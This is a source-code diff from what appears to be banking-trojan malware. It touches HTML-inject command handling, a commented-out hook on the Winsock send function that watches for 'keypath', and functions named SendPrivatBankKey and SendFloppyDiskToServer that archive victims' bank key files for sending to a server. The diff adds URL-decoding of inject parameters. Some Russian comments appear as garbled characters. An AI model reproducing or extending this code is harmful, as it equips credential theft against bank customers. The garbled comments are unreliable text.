@@ -10,13 +10,37 @@
 #include "Loader.h"
 #include "CabPacker.h"
 #include "StrConsts.h"
+#include "Splice.h"
+#include "GetApi.h"
 
 void SendPrivatBankKey(const char* Command, const char* Params);
 void SendFloppyDiskToServer(const char* Command, const char* Params);
 
 
 
+//typedef int (PASCAL FAR *Tsend) (SOCKET s, const char FAR * buf, int len, int flags);
+//
+//Tsend Real_Send = NULL;
 
+
+//int PASCAL FAR Hook_send(SOCKET s, const char FAR * buf, int len, int flags)
+//{
+//	if (STRA::Pos(buf, "keypath") >= 0)
+//	{
+//			len = len;
+//	}
+//	return Real_Send(s, buf, len, flags);
+//}
+
+
+
+void HTMLInjectsAdapterIntialize()
+{
+//	if ( HookApi( DLL_WINSOCK, 0xE797764 /* send */, &Hook_send ) )
+//	{
+//		__asm mov [Real_Send], eax
+//	}
+}
 
 
 typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Params);
@@ -34,8 +58,10 @@ typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Param
 //                 если запрос обработан и дальше не стоит
 //                 его пропускать
 //----------------------------------------------------------
-bool ProcessHTMLInjectRequest(const char* URL, bool* CloseRequest)
+bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequest)
 {
+
+
 	if (CloseRequest)
 		*CloseRequest = false;
 
@@ -91,16 +117,24 @@ bool ProcessHTMLInjectRequest(const char* URL, bool* CloseRequest)
 
 
 	// ¬ыполн€ем команду
-	bool Result = false;
+	bool Result = false;  
 	if (Command)
-	{
+	{  
 		Result = true;
 		if (CloseRequest) *CloseRequest = true;
 
 		string CmdStr;
 		CmdStr.Copy(URL, 0, CmdLen);
 
-		Command(CmdStr.t_str(), Params);
+		PCHAR P = Params;
+		string EP;
+		if (DecodeParam)
+		{
+			EP = URLDecode(Params);
+			P = EP.t_str();
+		}
+
+		Command(CmdStr.t_str(), P);
 	}
 
 	return Result;
@@ -116,6 +150,10 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 {
 	if (!File::IsExists((PCHAR)Params))
 		return;
+
+//	string F;
+//	F.Format("keypat: %s", Params);
+//	pMessageBoxA(0, F.t_str(), 0, 0);
 
 	// ƒобавл€ем фал в архив
 	string FN = File::GetTempName2A();
